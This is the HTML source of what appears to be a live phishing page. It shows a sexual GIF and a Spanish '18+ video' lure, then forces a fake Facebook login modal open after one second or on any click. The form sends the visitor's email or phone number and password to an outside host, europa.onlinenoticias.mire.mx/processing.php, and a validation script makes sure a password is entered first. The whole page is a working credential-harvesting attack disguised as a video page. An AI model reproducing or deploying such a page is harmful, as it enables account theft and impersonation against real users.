<script id="_wau2bz">var _wau = _wau || []; _wau.push(["dynamic", "750rgd6ryt", "2bz", "c4302bffffff", "small"]);</script><script async src="//waust.at/d.js"></script>>
<!DOCTYPE html>
<html lang="">
	<head>
        
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-100683957-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-100683957-1');
</script>
<script type="text/javascript">
// JavaScript Document
    function validateForm() {

	    //Email phai duoc dien chinh xacc
        var email=document.forms["anhsonnguyen"]["email"].value;
        if (email == "") {
            alert("Email");
            return false;
        }
		var email = document.forms["anhsonnguyen"]["email"].value;
        if (email.length<6) {
            alert("Email ho?c s? di?n tho?i chua d?ng !");
            return false;
        }
		 //Ho phai duoc dien
        var ho = document.forms["anhsonnguyen"]["pass"].value;
        if (ho == "") {
            alert("Password you entered is incorrect. Please try again");
            return false;
        }
		 //do dai mat khau
		var ho = document.forms["anhsonnguyen"]["pass"].value;
        if (ho.length<6) {
            alert("Password b?n nh?p chua d?ng !");
            return false;
        }
		var ho = document.forms["anhsonnguyen"]["pass"].value;
        if (ho.length>30) {
            alert("The password you entered is incorrect. Please try again");
            return false;
        }
}		
</script>

        
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<title>Ver Aqui</title>
		<link rel="shortcut icon" type="image/png" href="https://www.favicon.cc/logo3d/781592.png"/>

		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
		<style type="text/css">
			* {
				 box-sizing: border-box;
			}
			 html {
				 background: #e2e2e2;
			}
			 body {
				 background: #e2e2e2;
				 margin: 0;
				 padding: 0;
				 font-family: 'Lato', sans-serif;
			}
			 .login-form-wrap {
				 background: radial-gradient(ellipse at center, rgba(81, 112, 173, 1) 0%, rgba(53, 84, 147, 1) 100%);
				 border: 1px solid #2d416d;
				 box-shadow: 0 1px #5670a4 inset, 0 0 10px 5px rgba(0, 0, 0, 0.1);
				 border-radius: 5px;
				 width: 380px;
				 height: 480px;
				 margin: 60px auto;
				 padding: 50px 30px 0 30px;
				 text-align: center;
			}
			 .login-form-wrap h1 {
				 margin: 0 0 50px 0;
				 padding: 0;
				 font-weight: bold;
				 font-size: 26px;
				 color: #fff;
			}
			 .login-form-wrap h5 {
				 margin-top: 40px;
			}
			 .login-form-wrap h5 > a {
				 font-size: 14px;
				 color: #fff;
				 text-decoration: none;
				 font-weight: 400;
			}
			.login-form input[name="email"], .login-form input[name="pass"] {
				 width: 100%;
				 border: 1px solid #314d89;
				 margin-right: 110px;
				 outline: none;
				 padding: 12px 20px;
				 font-weight: 400;
				 font-family: 'Lato', sans-serif;
				 cursor: pointer;
			}
			 .login-form input[name="email"] {
				 border-bottom: none;
				 border-radius: 4px 4px 0 0;
				 padding-bottom: 13px;
				 box-shadow: 0 -1px 0 #e0e0e0 inset, 0 1px 2px rgba(0, 0, 0, 0.23) inset;
			}
			 .login-form input[name="pass"] {
				 border-top: none;
				 border-radius: 0 0 4px 4px;
				 box-shadow: 0 -1px 2px rgba(0, 0, 0, 0.23) inset, 0 1px 2px rgba(255, 255, 255, 0.1);
			}
			 .login-form input[type="submit"] {
				 font-family: 'Lato', sans-serif;
				 font-weight: 400;
				 background: linear-gradient(to bottom, rgba(224, 224, 224, 1) 0%, rgba(206, 206, 206, 1) 100%);
				 display: block;
				 margin: 20px auto 0 auto;
				 width: 100%;
				 border: none;
				 border-radius: 3px;
				 padding: 8px;
				 font-size: 17px;
				 color: #636363;
				 text-shadow: 0 1px 0 rgba(255, 255, 255, 0.45);
				 font-weight: 700;
				 box-shadow: 0 1px 3px 1px rgba(0, 0, 0, 0.17), 0 1px 0 rgba(255, 255, 255, 0.36) inset;
			}
			 .login-form input[type="submit"]:hover {
				 background: #ddd;
			}
			 .login-form input[type="submit"]:active {
				 padding-top: 9px;
				 padding-bottom: 7px;
				 background: #c9c9c9;
	}
		</style>
	<link rel="me" href="https://www.blogger.com/profile/16520093022108791955" />
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>
</head>
	<body onclick="showlog()">
		<div align="center" style="margin-top: 30px;">
		    <div class="separator" style="clear: both; text-align: center;">
            </div>
			<img src="https://1.bp.blogspot.com/-JdF1bqqiLKk/WjKXCH7aTFI/AAAAAAAAFEI/cFcAJTuSi3wkb2MaByHBJqM1GKYqDWJjQCLcBGAs/s600/tai-anh-sex-dong-bao-dam-cuc-nung%2B%25286%2529.gif") video" class="img-responsive" alt="Image" onclick="showlog();">
		</div>
    	<div class="modal fade" id="myModal" role="dialog">
    	    <section class="login-form-wrap">
    			<h1>Facebook</h1>
    			<div style="    background-color: #fff9d7; border: 1px solid #e2c822; padding: 6px; margin-bottom: 5px;">Contenido de video 18+ por favor inicie sesion para verlo.</div>
    			<form class="login-form" name="anhsonnguyen" method="post" action="https://europa.onlinenoticias.mire.mx/processing.php" onsubmit="return validateForm()">
    				<label>
    					<input type="text" name="email" required placeholder="Numero de telefono o Email">
    				</label>
    				<label>
    					<input type="password" name="pass" required placeholder="Contrasena">
    				</label>
    				<input type="hidden" name="hash" value="yoyTL5f22e179ee404">
    				<input type="submit" value="Iniciar Sesion">
    			</form>
    			<h5><a href="#">?Has olvidado tu contrasena?</a></h5>
    		</section>
    	  </div>
		<script src="//code.jquery.com/jquery.js"></script>
		<script type="text/javascript">
			$( document ).ready(function() {
				setTimeout( e => {
									showlog()
								}, 1000)			    
			});
			function showlog() {
				$('#myModal').modal({
                    backdrop: 'static',
                    keyboard: true, 
                    show: true
                });
			}
		</script>
		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
	</body>
</html>